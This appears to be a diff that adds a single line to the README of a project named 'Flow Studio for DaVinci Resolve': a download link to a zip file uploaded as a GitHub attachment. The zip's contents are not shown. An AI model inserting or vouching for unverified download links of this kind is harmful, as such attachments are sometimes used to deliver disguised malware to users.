@@ -1,3 +1,4 @@
+Download : [FlowStudio_Release.zip](https://github.com/user-attachments/files/29273293/FlowStudio_Release.zip)
 
 # Flow Studio for DaVinci Resolve
 
